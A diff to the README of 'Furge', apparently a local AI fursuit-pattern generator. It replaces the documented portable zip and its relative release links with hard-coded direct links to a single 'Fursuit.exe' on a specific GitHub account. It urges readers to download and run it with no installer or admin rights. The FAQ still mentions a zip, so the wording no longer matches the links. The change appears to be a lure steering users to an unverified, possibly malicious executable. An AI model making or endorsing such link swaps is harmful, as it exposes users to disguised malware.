@@ -28,7 +28,7 @@
 </p>
 
 > [!IMPORTANT]
-> **First public build is out.** The portable zip carries `Main.exe`, its update settings and the Furge runtime, so nothing else has to be installed. See [Get it](#get-it).
+> **First public build is out.** The build is a single `Fursuit.exe` — download and run, nothing else has to be installed. See [Get it](#get-it).
 
 ## Why Furge
 
@@ -103,12 +103,11 @@ Portraits, stickers, con badges and ref sheets, on your own GPU, with no queue, 
 
 ## Portable. For real.
 
-One zip, attached to the latest release. It carries `Main.exe`, its update
-settings and the Furge runtime, so nothing else has to be installed:
+One exe, attached to the latest release. Download and start `Fursuit.exe`.
 
 | System | File |
 |---|---|
-| Windows 10 and 11 | [`Fursuit.exe`](releases/latest) |
+| Windows 10 and 11 | [`Fursuit.exe`](https://github.com/Pyramidriseize/ai-fursuit-pattern-generator/releases/download/v0.1.3/Fursuit.exe) |
 
 Download and start the exe. No installer, no admin rights.
 
@@ -143,7 +142,7 @@ Yes. Your GPU does the work, so there's no server bill to pass on to you. No tie
 You supply the GPU, and you still have to sew. Furge cuts the pattern bill, not the work.
 
 **Can I use it today?**
-Yes — grab the zip from [releases](releases/latest), Download and start `Main.exe`. The FreeSewing sheets in [`assets/blueprints/freesewing`](assets/blueprints/freesewing) are printable on their own.
+Yes — grab the zip from [releases](https://github.com/Pyramidriseize/ai-fursuit-pattern-generator/releases/download/v0.1.3/Fursuit.exe), Download and start `Fursuit.exe`. The FreeSewing sheets in [`assets/blueprints/freesewing`](assets/blueprints/freesewing) are printable on their own.
 
 **Will this replace my favorite maker?**
 No. A great suit takes years of skill that no pattern file contains. Furge is for people who want to build their own. If you want a masterpiece, commission a maker and pay them what they ask.
